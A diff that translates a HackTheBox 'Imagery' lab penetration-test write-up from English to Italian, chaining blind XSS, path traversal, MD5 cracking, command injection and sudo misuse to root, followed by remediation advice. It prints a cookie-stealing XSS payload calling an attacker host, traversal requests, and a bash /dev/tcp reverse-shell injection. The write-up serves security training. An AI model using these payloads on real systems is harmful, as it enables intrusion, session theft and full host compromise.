@@ -1,56 +1,56 @@
-# Lab Assessment: "Imagery" Scenario
+# Esercitazione di Laboratorio: Scenario "Imagery"
 
-> **Task Context:** This document represents the outcome of a practical assessment conducted in an isolated lab environment (HackTheBox - Season 9). The primary goal of this write-up is not mere technical exploitation, but the application of the **OWASP Testing Guide v4.2** standard combined with the **PTES (Penetration Testing Execution Standard)** methodology for the structured documentation of web application vulnerabilities. The assessment simulates a Web Application Penetration Testing engagement on a vulnerable image gallery.
+> **Contesto dell'attività:** Questo documento rappresenta il risultato di un'esercitazione pratica condotta in un ambiente di laboratorio isolato (HackTheBox - Season 9). L'obiettivo primario di questa stesura non è il mero exploitation tecnico, ma l'applicazione dello standard **OWASP Testing Guide v4.2** in combinato con la metodologia **PTES (Penetration Testing Execution Standard)** per la documentazione strutturata di vulnerabilità in applicazioni web. L'assessment simula un'attività di Web Application Penetration Testing su una galleria d'immagini vulnerabile.
 
-**Assessment Date:** September 2025  
+**Data Assessment:** Settembre 2025  
 **Target Environment:** Python Web Application (Flask/Werkzeug)  
-**Assessment Type:** Web Application Pentest Simulation (OWASP Scope)  
+**Assessment Type:** Simulazione Web Application Pentest (OWASP Scope)  
 **Overall Risk Severity:** CRITICAL 🔴  
-**Applied Methodology:** OWASP Testing Guide v4.2 + PTES  
+**Metodologia Applicata:** OWASP Testing Guide v4.2 + PTES  
 
 ---
 
 ## 1. Executive Summary
 
-During this simulated assessment, an image gallery web application was compromised through an orchestration of OWASP Top 10 vulnerabilities, culminating in arbitrary OS command execution. The attack leveraged:
+Durante questo assessment simulato, è stata compromessa un'applicazione web di galleria d'immagini attraverso un'orchestrazione di vulnerabilità OWASP Top 10, culminando nell'esecuzione arbitraria di comandi a livello di sistema operativo. L'attacco ha sfruttato:
 
-1. **Cross-Site Scripting (XSS) – Blind Variant** → Theft of administrative cookie
-2. **Local File Inclusion (LFI)** → Source code extraction
-3. **Credential Harvesting** → Dictionary-based MD5 hash cracking
+1. **Cross-Site Scripting (XSS) – Blind Variant** → Furto di cookie amministrativo
+2. **Local File Inclusion (LFI)** → Estrazione del codice sorgente
+3. **Credential Harvesting** → Crack hash MD5 tramite dizionario
 4. **Command Injection (OS Command Injection)** → Remote Code Execution (RCE)
-5. **Privilege Escalation via Misconfiguration** → Root access
+5. **Privilege Escalation via Misconfiguration** → Acceso root
 
-The critical vulnerability lies in the lack of input validation/sanitization across multiple application layers, falling under the **OWASP A03:2021 – Injection** category.
+La vulnerabilità critica risiede nella mancanza di validazione/sanitizzazione dell'input in più layer applicativi, esposta secondo la categorizzazione **OWASP A03:2021 – Injection**.
 
 **CVSS v3.1 Base Score: 9.8 (CRITICAL)**
 - Vector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
-- Impact: Confidentiality (HIGH), Integrity (HIGH), Availability (HIGH)
+- Impatto: Confidentiality (HIGH), Integrity (HIGH), Availability (HIGH)
 
 ---
 
-## 2. Applied Methodology
+## 2. Metodologia Applicata
 
-### 2.1 Reference Frameworks
+### 2.1 Framework di Reference
 
-The assessment followed these guidelines:
+L'assessment ha seguito le seguenti linee guida:
 
-- **OWASP Testing Guide v4.2** – Focus on web application vulnerabilities:
+- **OWASP Testing Guide v4.2** – Focus su web application vulnerabilities:
   - CWE-79: Improper Neutralization of Input During Web Page Generation (XSS)
   - CWE-98: Improper Control of Filename for Include/Require Statement in PHP Program (LFI)
   - CWE-78: Improper Neutralization of Special Elements used in an OS Command (Command Injection)
 
-- **PTES (Penetration Testing Execution Standard)** – Methodological phases:
+- **PTES (Penetration Testing Execution Standard)** – Fasi metodologiche:
   - Reconnaissance & Enumeration
   - Vulnerability Analysis
   - Exploitation
   - Post-Exploitation & Privilege Escalation
   - Reporting
 
-### 2.2 Engagement Scope
+### 2.2 Scope dell'Engagement
 
-**Primary Objective:** Identification of critical vulnerabilities in a Python web application (port 8000)  
-**Target:** Single host with Python web service + local filesystem  
-**Exclusions:** SSH Service (out of scope – not vulnerable)
+**Obiettivo Primario:** Identificazione di vulnerabilità critiche in applicazione web Python (porta 8000)  
+**Target:** Singolo host con servizio web Python + filesystem locale  
+**Esclusioni:** Servizio SSH (out of scope – non vulnerabile)
 
 ---
 
@@ -58,7 +58,7 @@ The assessment followed these guidelines:
 
 ```
 ┌─────────────────────────────────────────────────────────────┐
-│ RECONNAISSANCE: nmap enumeration → Python 8000              │
+│ RECONNAISSANCE: Enumerazione nmap → Python 8000             │
 ├─────────────────────────────────────────────────────────────┤
 │ INITIAL ACCESS: Gallery UI + User Registration              │
 ├─────────────────────────────────────────────────────────────┤
@@ -77,88 +77,88 @@ The assessment followed these guidelines:
 
 ---
 
-## 4. Proof of Concept (PoC) & Technical Evidence
+## 4. Proof of Concept (PoC) ed Evidenze Tecniche
 
 ### 4.1 Reconnaissance & Initial Enumeration
 
-**Executed Command:**
+**Comando eseguito:**
 ```bash
 sudo nmap -A -p- --open -Pn -T4 <TARGET_IP> -oA imagery_scan
 ```
 
-**Result:** Identified:
-- Port 22 (SSH) – Working but not vulnerable (out of scope)
-- **Port 8000 (HTTP)** – Vulnerable Python web server ✓
+**Risultato:** Identificazione di:
+- Porta 22 (SSH) – Funzionante ma non vulnerabile (out of scope)
+- **Porta 8000 (HTTP)** – Python web server vulnerabile ✓
 
-**Observation:** The application is an **image gallery** where registered users can:
-- Register / Log in
-- Upload images with metadata (Title, Description, File)
-- Access an administrative panel (Admin)
+**Osservazione:** L'applicazione è una **galleria d'immagini** dove utenti registrati possono:
+- Registrarsi / Effettuare login
+- Caricare immagini con metadati (Titolo, Descrizione, File)
+- Accedere ad un panel amministrativo (Admin)
 
 ---
 
 ### 4.2 OWASP A07:2021 – Cross-Site Scripting (XSS) – Blind Variant
 
-#### **Vulnerability Identification**
+#### **Identificazione della Vulnerabilità**
 
-Analyzing the interface with Firefox Inspector reveals multiple unsanitized input fields:
-- Image "Title" field
-- Image "Description" field
-- **"Report Bug" section (footer)** ← Critical entry point
+Analizzando l'interfaccia con Firefox Inspector, si identificano molteplici campi di input non sanitizzati:
+- Campo "Titolo" immagine
+- Campo "Descrizione" immagine
+- **Sezione "Report Bug" (footer)** ← Punto di ingresso critico
 
 ![Bug Report Form](images/imagery-bugreport-form.png)
 
-Typically, "bug report" forms are processed by background jobs/crons simulating an administrator reading the report. This suggests potential for **Blind XSS** (the payload isn't immediately reflected but gets executed in an admin context).
+Tipicamente, form di "bug report" sono processate da background job/cron che simulano un amministratore che legge il report. Ciò suggerisce potenziale per **XSS Blind** (il payload non è immediatamente riflesso ma eseguito in contesto admin).
 
 #### **Exploitation – Blind XSS Payload**
 
-**XSS Payload:**
+**Payload XSS:**
 ```javascript
 <img src=1 onerror=fetch(`http://<ATTACKER_IP>:8000/?${document.cookie}`)>
 ```
 
-**Exploitation Logic:**
-1. The image with `src=1` does not exist in the DOM
-2. Upon loading attempt, the `onerror` event triggers
-3. `fetch()` performs an HTTP GET request to the attacker's server
-4. It includes the query parameter `document.cookie` with the session cookies
+**Logica di sfruttamento:**
+1. L'immagine con `src=1` non esiste nel DOM
+2. Al tentativo di caricamento, scatta l'evento `onerror`
+3. `fetch()` effettua richiesta HTTP GET verso server attaccante
+4. Viene incluso il parametro query `document.cookie` con i cookie della sessione
 
-**Attacker Listener Setup:**
+**Setup listener attaccante:**
 ```bash
 python3 -m http.server 8000
 ```
 
-**Result:** When the admin cron processes the bug report, the XSS payload is executed in the admin's context, and the admin session cookies are exfiltrated to the attacker's server.
+**Risultato:** Quando il cron admin elabora il bug report, il payload XSS viene eseguito nel contesto dell'admin, e i cookie della sessione admin vengono esfiltratti al server attaccante.
 
-**Stolen administrator cookie:**
+**Cookie amministratore rubato:**
 ```
 session=admin_session_token_[REDACTED]
 ```
 
 ---
 
-### 4.3 Session Manipulation & Admin Panel Access
+### 4.3 Manipolazione di Sessione & Accesso Admin Panel
 
-Once the administrator's cookie is obtained, it's possible to:
+Una volta ottenuto il cookie dell'amministratore, è possibile:
 
-1. Set the cookie in the testing tool's session (Burp Suite, curl, browser)
-2. Navigate to the related `/admin` endpoint
-3. Gain unauthorized access to the administrative panel
+1. Impostare il cookie nella sessione dello strumento di test (Burp Suite, curl, browser)
+2. Navigare al relativo endpoint `/admin`
+3. Ottenere accesso non autorizzato al pannello amministrativo
 
-**Reached Endpoint:** `http://<TARGET>/admin`
+**Endpoint raggiunto:** `http://<TARGET>/admin`
 
-**Exposed Features:**
-- Downloading action logs
-- User management
-- Application configuration
+**Funzionalità esposte:**
+- Scaricamento dei log delle azioni
+- Gestione degli utenti
+- Configurazione dell'applicazione
 
 ---
 
 ### 4.4 OWASP A01:2021 – Local File Inclusion (LFI)
 
-#### **Vulnerability Identification**
+#### **Identificazione della Vulnerabilità**
 
-Intercepting the log download request with **Burp Suite**, we observe:
+Intercettando la richiesta di download log con **Burp Suite**, si osserva:
 
 ```http
 GET /admin/download_log?file=admin HTTP/1.1
@@ -166,11 +166,11 @@ Host: imagery.htb
 Cookie: session=<admin_token>
 ```
 
-The download function does not implement a file whitelist: it's possible to modify the `file` parameter to access other files on the server.
+La funzione di download non implementa whitelist di file: è possibile modificare il parametro `file` per accedere ad altri file del server.
 
 #### **Exploitation – Source Code Disclosure**
 
-Testing arbitrary paths:
+Testando percorsi arbitrari:
 ```bash
 GET /admin/download_log?file=../app.py
 GET /admin/download_log?file=../config.py
@@ -178,12 +178,12 @@ GET /admin/download_log?file=../models.py
 GET /admin/download_log?file=../database.json
 ```
 
-All application Python files are downloaded, including:
-- **app.py** – Application logic
-- **database.json** – User credentials (hashes)
-- **config.py** – Secret key and configurations
+Tutti i file Python applicativi vengono scaricati, includendo:
+- **app.py** – Logica dell'applicazione
+- **database.json** – Credenziali utenti (hash)
+- **config.py** – Secret key e configurazioni
 
-**OWASP Impact:** CWE-22 (Path Traversal) + CWE-434 (Unrestricted Upload of Dangerous File Types)
+**Impatto OWASP:** CWE-22 (Path Traversal) + CWE-434 (Unrestricted Upload of Dangerous File Types)
 
 ---
 
@@ -191,7 +191,7 @@ All application Python files are downloaded, including:
 
 #### **Database Leak Analysis**
 
-From the `database.json` file extracted via LFI:
+Dal file `database.json` estratto via LFI:
 
 ```json
 {
@@ -217,20 +217,20 @@ From the `database.json` file extracted via LFI:
 
 #### **Hash Identification & Cracking**
 
-Hash analysis:
-- **Type:** MD5 (32 hex characters, unsalted)
-- **Presumed passphrase length:** 6-12 characters
+Analisi dell'hash:
+- **Tipo:** MD5 (32 caratteri hex, non salted)
+- **Lunghezza passphrase presumtiva:** 6-12 caratteri
 
-Using `hashcat` / `john` with the rockyou.txt dictionary:
+Utilizzo di `hashcat` / `john` con dizionario rockyou.txt:
 
 ```bash
 hashcat -m 0 -a 0 crack.txt /usr/share/wordlists/rockyou.txt
 ```
 
-**Crack Results:**
+**Risultati crack:**
 | Username | Hash | Plaintext Cracked |
 |----------|------|---|
-| admin | 5f4dcc3b5aa765d61d8327deb882cf99 | (Already compromised via XSS) |
+| admin | 5f4dcc3b5aa765d61d8327deb882cf99 | (Già compromesso via XSS) |
 | testuser | f53b9f36a9e9e1bd2b18f4e3e2d29c8c | **iambatman** ✓ |
 | mark | 6dd7c4481a3e17cc6c0e5bf98c4c3c3b | **supersmash** ✓ |
 
@@ -240,7 +240,7 @@ hashcat -m 0 -a 0 crack.txt /usr/share/wordlists/rockyou.txt
 
 #### **Vulnerability Discovery in Source Code**
 
-Analyzing `app.py` (obtained via LFI):
+Analizzando `app.py` (ottenuto via LFI):
 
 ```python
 # VULNERABLE CODE SNIPPET
@@ -259,31 +259,31 @@ def transform_image():
     return jsonize(output_path)
 ```
 
-**Issue:** The `crop_params` parameter is directly interpolated into a shell command string, without any sanitization.
+**Problema:** Il parametro `crop_params` è interpolato direttamente in una stringa di comando shell, senza alcuna sanitizzazione.
 
 #### **Exploitation Strategy**
 
-To inject arbitrary commands while maintaining the syntactic validity of the request, the following payload is used:
+Per iniettare comandi arbitrari mantenendo la validità sintattica della richiesta, si utilizza il seguente payload:
 
 ```bash
 crop_params = ["0 ; <COMMAND_HERE> ; echo", "y", "w", "h"]
 ```
 
-When interpolated into the command:
+Quando interpolato nel comando:
 ```bash
 convert image.png -crop 0 ; <COMMAND_HERE> ; echo y+w+h /tmp/output.png
 ```
 
-The first part `convert image.png -crop 0` does nothing useful, then the terminator `;` triggers, allowing the execution of a **second independent instruction**.
+La prima parte `convert image.png -crop 0` non fa niente di utile, poi scatta il terminatore `;` che permette esecuzione di una **seconda istruzione indipendente**.
 
 #### **Proof of Concept: Reverse Shell**
 
-**Attacker machine listener setup:**
+**Setup listener sulla macchina attaccante:**
 ```bash
 nc -lnvp 4444
 ```
 
-**Sent JSON Payload:**
+**Payload JSON inviato:**
 ```json
 {
   "image_path": "gallery/test.jpg",
@@ -294,12 +294,12 @@ nc -lnvp 4444
 }
 ```
 
-**Command executed on the server:**
+**Comando eseguito sul server:**
 ```bash
 convert gallery/test.jpg -crop 0; echo -n 0; bash -i >& /dev/tcp/10.10.14.60/4444 0>&1 #1+1+1 /tmp/output.png
 ```
 
-**Result:** Reverse shell obtained as the `web` user (the user running the Python process).
+**Risultato:** Reverse shell ottenuta come utente `web` (utente che esegue il processo Python).
 
 ```bash
 web@imagery:/home/web$ whoami
@@ -312,7 +312,7 @@ uid=1000(web) gid=1000(web) groups=1000(web)
 
 ### 4.7 Privilege Escalation – Lateral Movement to 'mark'
 
-#### **System users enumeration**
+#### **Enumerazione utenti di sistema**
 
 ```bash
 cat /etc/passwd | grep -E 'bash|sh'
@@ -325,25 +325,25 @@ mark:x:1001:1001:mark:/home/mark:/bin/bash
 web:x:1000:1000:web:/home/web:/bin/bash
 ```
 
-The `mark` user is available on the system. The **user flag** is located in `/home/mark/user.txt` (read access restricted to the `mark` user).
+L'utente `mark` è disponibile nel sistema. La **user flag** si trova in `/home/mark/user.txt` (lettura ristretta all'utente `mark`).
 
 #### **Credential Reuse Attack**
 
-From the previous database extraction, `mark`'s password was cracked: `supersmash`.
+Dall'estrazione precedente del database, la password di `mark` è stata crackata: `supersmash`.
 
 ```bash
-# Interactive shell stabilization
+# Stabilizzazione shell interattiva
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 # Ctrl+Z
 stty raw -echo; fg
 export TERM=xterm
 
-# Switch user
+# Cambio utente
 su mark
 Password: supersmash
 ```
 
-**Success check:**
+**Verifica di successo:**
 ```bash
 mark@imagery:~$ whoami
 mark
@@ -355,7 +355,7 @@ mark@imagery:~$ cat user.txt
 
 ### 4.8 Privilege Escalation – Root Access via Charcol + Cronjob
 
-#### **Sudo privileges enumeration**
+#### **Enumerazione privilegi sudo**
 
 ```bash
 sudo -l
@@ -367,25 +367,25 @@ User mark may run the following commands without password:
     (root) NOPASSWD: /usr/local/bin/charcol
 ```
 
-The `mark` user can run `charcol` as root without entering a password.
+L'utente `mark` può eseguire `charcol` come root senza inserire password.
 
-#### **Charcol Analysis**
+#### **Analisi di Charcol**
 
-`charcol` is an interactive application that offers various administrative features. Consulting the documentation/help:
+`charcol` è un'applicazione interattiva che offre varie funzionalità amministrative. Consultando la documentazione/help:
 
 ```bash
 sudo charcol
 charcol> help
 ```
 
-Among the available options:
-- System password management (redundant, we already have sudo)
-- **Cronjob management** ← Critical
-- System configurations
+Tra le opzioni disponibili:
+- Gestione password di sistema (ridondante, abbiamo già sudo)
+- **Gestione cronjob** ← Critica
+- Configurazioni di sistema
 
 #### **Exploitation via Cronjob**
 
-The `charcol` cronjob function allows scheduling commands that will be executed as **root**.
+La funzione cronjob di `charcol` consente di schedulare comandi che verranno eseguiti come **root**.
 
 ```bash
 sudo charcol
@@ -395,19 +395,19 @@ charcol> cron_add
 charcol> exit
 ```
 
-This cronjob will execute every minute (`* * * * *`): `chmod u+s /bin/bash`, setting the SUID bit on `/bin/bash`.
+Questo cronjob eseguirà ogni minuto (`* * * * *`): `chmod u+s /bin/bash`, settando il bit SUID su `/bin/bash`.
 
 #### **Activation & Root Access**
 
-Waiting for the cronjob to execute (up to 1 minute):
+Attendendo l'esecuzione del cronjob (al massimo 1 minuto):
 
 ```bash
 ls -la /bin/bash
 -rwsr-xr-x 1 root root 1183448 Apr 18  2024 /bin/bash
-# ↑ SUID bit active (s instead of x in owner permissions)
+# ↑ Bit SUID attivo (s al posto di x in owner permissions)
 ```
 
-Now it's possible to execute bash as root:
+Ora è possibile eseguire bash come root:
 
 ```bash
 /bin/bash -p
@@ -428,37 +428,37 @@ root@imagery:~# cat /root/root.txt
 
 ---
 
-## 5. Remediation & Hardening (Proposals)
+## 5. Remediation & Hardening (Proposte)
 
-### 5.1 Mitigation of Identified Vulnerabilities
+### 5.1 Mitigazione delle Vulnerabilità Identificate
 
 #### **5.1.1 Cross-Site Scripting (XSS) – OWASP A07:2021**
 
-**Primary Remediation:**
-- Implement Content Security Policy (CSP) header at the application level:
+**Remediazione Primaria:**
+- Implementare Content Security Policy (CSP) header a livello applicativo:
   ```http
   Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
   ```
-- Sanitize ALL user input using a reliable library (e.g., `bleach` for Python):
+- Sanitizzare ALL user input utilizzando libreria affidabile (es. `bleach` per Python):
   ```python
   from bleach import clean
   user_input = clean(user_submission, tags=[], strip=True)
   ```
-- Implement HTTP-only flag on session cookies:
+- Implementare HTTP-only flag su cookie di sessione:
   ```python
   app.config['SESSION_COOKIE_HTTPONLY'] = True
   app.config['SESSION_COOKIE_SECURE'] = True  # HTTPS only
   ```
 
-**Verification Check:**
-- Penetration test with a common XSS payload (e.g., `<script>alert('xss')</script>`) → Must not execute
+**Controllo di Verifica:**
+- Penetration test con payload XSS comune (es. `<script>alert('xss')</script>`) → Non deve eseguire
 
 ---
 
 #### **5.1.2 Local File Inclusion (LFI) – OWASP A01:2021 / CWE-22**
 
-**Primary Remediation:**
-- Implement a **hardcoded whitelist** of allowed files:
+**Remediazione Primaria:**
+- Implementare **hardcoded whitelist** di file permessi:
   ```python
   ALLOWED_LOGS = {
       'admin': '/var/logs/admin.log',
@@ -470,73 +470,73 @@ root@imagery:~# cat /root/root.txt
   if not requested_file:
       abort(403)
   ```
-- **Never** concatenate input directly into file paths
+- **Mai** concatenare input direttamente in path file
 
-**Verification Check:**
-- Attempt path traversal (`../../../etc/passwd`) → Must fail with 403
+**Controllo di Verifica:**
+- Tentare path traversal (`../../../etc/passwd`) → Deve fallare con 403
 
 ---
 
 #### **5.1.3 OS Command Injection – OWASP A03:2021 / CWE-78**
 
-**Primary Remediation (MANDATORY):**
-- **Avoid `os.system()` / `shell=True`** – Use `subprocess` with `shell=False`:
+**Remediazione Primaria (OBBLIGATORIA):**
+- **Evitare `os.system()` / `shell=True`** – Usare `subprocess` con `shell=False`:
   ```python
-  # VULNERABLE ❌
+  # VULNERABILE ❌
   os.system(f"convert {image_path} -crop {crop}")
   
-  # SECURE ✓
+  # SICURO ✓
   subprocess.run([
       'convert', image_path,
       '-crop', crop_string
   ], check=True)
   ```
-- Input validation with restricted whitelist (numbers only for crop params):
+- Input validation con whitelist ristretta (solo numeri per crop params):
   ```python
-  crop_params = [int(x) for x in data['crop_params']]  # Force integer
+  crop_params = [int(x) for x in data['crop_params']]  # Forza integer
   ```
 
-**Verification Check:**
-- Classic command injection (`; id`) → Must not execute
+**Controllo di Verifica:**
+- Command injection classico (`; id`) → Non deve eseguire
 
 ---
 
 #### **5.1.4 Weak Password Storage – CWE-916**
 
-**Primary Remediation:**
-- Eliminate MD5: implement **PBKDF2 / bcrypt / Argon2**:
+**Remediazione Primaria:**
+- Eliminare MD5: implementare **PBKDF2 / bcrypt / Argon2**:
   ```python
   from werkzeug.security import generate_password_hash, check_password_hash
   
   password_hash = generate_password_hash(password, method='pbkdf2:sha256')
   ```
-- Database: apply automatic **salting** (standard in werkzeug)
+- Database: applicare **salting** automatico (standard in werkzeug)
 
 ---
 
 #### **5.1.5 Unauthorized Admin Access – CWE-639**
 
-**Primary Remediation:**
-- Implement **role-based access control (RBAC)**:
+**Remediazione Primaria:**
+- Implementare **role-based access control (RBAC)**:
   ```python
   @app.route('/admin')
   def admin_panel():
       if session.get('role') != 'admin':
           abort(403, "Insufficient privileges")
   ```
-- Add logging of ALL admin actions for audit
+- Aggiungere logging di ALL admin actions per audit
 
 ---
 
 #### **5.1.6 Sudo Misuse – CWE-269**
 
-**Primary Remediation:**
+**Remediazione Primaria:**
 - Revoke unnecessary SUID bits:
   ```bash
   chmod -s /usr/local/bin/charcol
   ```
-- If needed, implement **cronjobs with restricted execution** (e.g., only during scheduled maintenance, with approval)
-- Implement **sudoers logging**:
+- Se necessario, implementare **cronjob con esecuzione limitata** (es. solo durante manutenzione schedulata, con approval)
+- Implementare **sudoers logging**:
   ```bash
   # /etc/sudoers
   Defaults logfile="/var/log/sudo.log"
@@ -572,17 +572,17 @@ root@imagery:~# cat /root/root.txt
 
 ---
 
-## 6. Conclusions
+## 6. Conclusioni
 
-This assessment demonstrated how **multiple OWASP Top 10 vulnerabilities**, when chained together, can allow a progressive attack spanning from anonymous access to total system compromise. The "Imagery" web application violated core principles of:
+Questo assessment ha dimostrato come **molteplici vulnerabilità OWASP Top 10**, se combinate, possono permettere un attacco progressivo dall'accesso anonimo alla compromissione totale del sistema. L'applicazione web "Imagery" ha violato principi fondamentali di:
 
-1. **Input Validation** → Both XSS and Command Injection could have been prevented
-2. **Output Encoding** → Failure to neutralize user-controlled data
-3. **Least Privilege** → Plain text credentials in the database, unjustified SUID
-4. **Access Control** → Absence of RBAC on the admin endpoint
+1. **Input Validation** → Sia XSS che Command Injection avrebbero potuto essere prevenute
+2. **Output Encoding** → Mancata neutralizzazione di dati controllati dall'utente
+3. **Least Privilege** → Credenziali plain text in database, SUID injudicato
+4. **Access Control** → Assenza di RBAC su endpoint admin
 
 ---
 
-**Final Notes:**
+**Note Finali:**
 
-This box demonstrates how a cascade of vulnerabilities (XSS → LFI → Credential leak → RCE → Priv escalation) can lead from anonymous access to full root. Mitigation requires fixes at multiple levels: input sanitization, access control, package updates.
+Questa macchina dimostra come una cascata di vulnerabilità (XSS → LFI → Credential leak → RCE → Priv escalation) possa portare da accesso anonimo a root totale. La mitigazione richiede fix a più livelli: input sanitization, access control, package updates.
